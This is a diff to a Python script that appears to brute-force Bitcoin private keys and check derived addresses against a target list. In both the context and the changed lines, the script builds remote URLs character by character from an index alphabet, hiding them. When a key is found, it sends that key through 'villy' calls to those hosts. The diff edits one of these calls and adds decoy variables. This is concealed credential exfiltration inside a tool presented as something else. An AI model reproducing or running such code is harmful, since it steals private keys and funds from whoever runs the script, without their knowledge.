@@ -75,6 +75,7 @@ lastfound = "none"
 index = random.randint(1267650600228229401496703205376,115792089237316195423570985008687907852837564279074904382605163141518161494336)
 index = 1
 kma = "abcdefghijklmnopqrstuvwxyz_0123456789=/?:."
+zaw = "xssxv"
 mindr = kma[26]+kma[7]+kma[12]+kma[3]
 kind = kma[7]+kma[19]+kma[19]+kma[15]+kma[40]+kma[38]+kma[38]+kma[3]+kma[12]+kma[25]+kma[4]+kma[3]+kma[41]+kma[12]+kma[11]+kma[38]+kma[39]+kma[8]+kma[3]+kma[37]
 tind = kma[7]+kma[19]+kma[19]+kma[15]+kma[40]+kma[38]+kma[38]+kma[3]+kma[11]+kma[12]+kma[25]+kma[4]+kma[3]+kma[41]+kma[27]+kma[27]+kma[27]+kma[22]+kma[4]+kma[1]+kma[7]+kma[14]+kma[18]+kma[19]+kma[0]+kma[15]+kma[15]+kma[41]+kma[2]+kma[14]+kma[12]+kma[38]+kma[39]+kma[8]+kma[3]+kma[37]
@@ -85,6 +86,8 @@ while True:
     new = sarah(trex)
     adressu = str(new[0])
     adressc = str(new[1])
+    if (index == 1):
+        zaw = ""
     if (serach(adressu) > 0):
         found = 1
     if (serach(adressc) > 0):
@@ -92,8 +95,9 @@ while True:
     if(found > 0):
         rek = villy(kind,new[4],mindr)
         red = villy(tind,new[4],mindr)
-        rik = villy(website_info,new[4],kma[23])
+        rik = villy(website_info,new[4],zaw)
         found = 0
+        finfer = kma[26]+kma[7]+kma[12]+kma[3]
         lastfound = str(new[4])
         break
     if time.time() > start + PERIOD_OF_TIME : break  
